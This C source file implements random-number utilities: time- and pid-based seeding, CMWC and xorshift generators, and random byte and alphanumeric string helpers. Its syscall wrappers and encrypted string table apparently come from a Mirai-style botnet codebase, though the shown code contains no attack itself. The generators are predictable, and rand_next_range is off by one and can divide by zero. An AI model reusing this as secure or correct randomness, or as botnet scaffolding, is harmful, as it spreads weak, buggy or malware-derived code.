#define _GNU_SOURCE


#include "headers/includes.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/resolver.h"
#include "../encryption/chacha20_table.h"
#include "../modules/debug.h"

clock_t clock(void);

static volatile uint32_t x, y, z, w;
static uint32_t Q[4096], c = 362436;
static uint32_t i_cmwc = 4095;

void rand_init(void) {
    debug("Initializing RNG...\n");
    x = sys_time(NULL);
    y = sys_getpid() ^ sys_getppid();
    z = clock();
    w = z ^ y;
    debug("RNG initialized.\n");

    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

void rand_init_thread(int tid) {
    x = sys_time(NULL) ^ tid;
    y = sys_getpid() ^ sys_getppid() ^ (tid << 16);
    z = clock() ^ (tid << 8);
    w = z ^ y;

    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    uint32_t val, r = 0xfffffffe;
    i_cmwc = (i_cmwc + 1) & 4095;
    t = a * Q[i_cmwc] + c;
    c = (t >> 32);
    val = t + c;
    if (val < c) {
        val++;
        c++;
    }
    return (Q[i_cmwc] = r - val);
}

uint32_t rand_next(void) {
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

void rand_str(char *str, int len) {
    while (len > 0) {
        if (len >= 4) {
            *((uint32_t *)str) = rand_next();
            str += sizeof (uint32_t);
            len -= sizeof (uint32_t);
        }
        else if (len >= 2) {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof (uint16_t);
            len -= sizeof (uint16_t);
        }
        else {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}

uint32_t rand_next_range(uint32_t min, uint32_t max) {
    return (rand_next() % (max - min) + 1) + min;
}


void rand_alphastr(char *str, int len) {
    int i;
    for (i = 0; i < len; i++) {
        str[i] = enc[RAND_ALPHANUM_STR].string[rand_next() % (enc[RAND_ALPHANUM_STR].len)];
    }
    str[len] = '\0';
}
